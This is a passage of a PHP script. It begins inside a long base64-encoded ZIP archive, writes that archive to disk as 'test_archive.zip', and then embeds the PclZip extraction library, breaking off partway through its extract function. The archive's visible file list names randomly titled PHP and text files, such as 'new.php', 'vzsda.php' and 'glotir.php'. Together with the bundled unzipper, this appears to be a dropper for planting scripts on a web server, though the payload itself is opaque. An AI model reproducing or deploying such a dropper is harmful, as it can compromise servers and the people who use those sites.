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"); 
file_put_contents("test_archive.zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      if ($v_string != '') {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
      else {
      }
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function add($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                 PCLZIP_OPT_PREPEND_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
											   ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

        return 0;
      }
    }
  }

  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
    return 0;
  }
  
  if (sizeof($v_string_list) != 0) {
    foreach ($v_string_list as $v_string) {
      $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
    }
  }
  
  $v_supported_attributes
  = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
           ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
           ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
           ,PCLZIP_ATT_FILE_MTIME => 'optional'
           ,PCLZIP_ATT_FILE_CONTENT => 'optional'
           ,PCLZIP_ATT_FILE_COMMENT => 'optional'
					);
  foreach ($v_att_list as $v_entry) {
    $v_result = $this->privFileDescrParseAtt($v_entry,
                                             $v_filedescr_list[],
                                             $v_options,
                                             $v_supported_attributes);
    if ($v_result != 1) {
      return 0;
    }
  }

  $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
  if ($v_result != 1) {
    return 0;
  }

  return $p_result_list;
}

function listContent()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $p_list = array();
  if (($v_result = $this->privList($p_list)) != 1)
  {
    unset($p_list);
    return(0);
  }

  return $p_list;
}

function extract()
{
  $v_result=1;

  $this->privErrorReset();

  if (!$this->privCheckFormat()) {
    return(0);
  }

  $v_options = array();
  $v_path = '';
  $v_remove_path = "";
  $v_remove_all_path = false;

  $v_size = func_num_args();

  $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

  if ($v_size > 0) {
    $v_arg_list = func_get_args();

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                 PCLZIP_CB_POST_EXTRACT => 'optional',
                                                 PCLZIP_OPT_SET_CHMOD => 'optional',
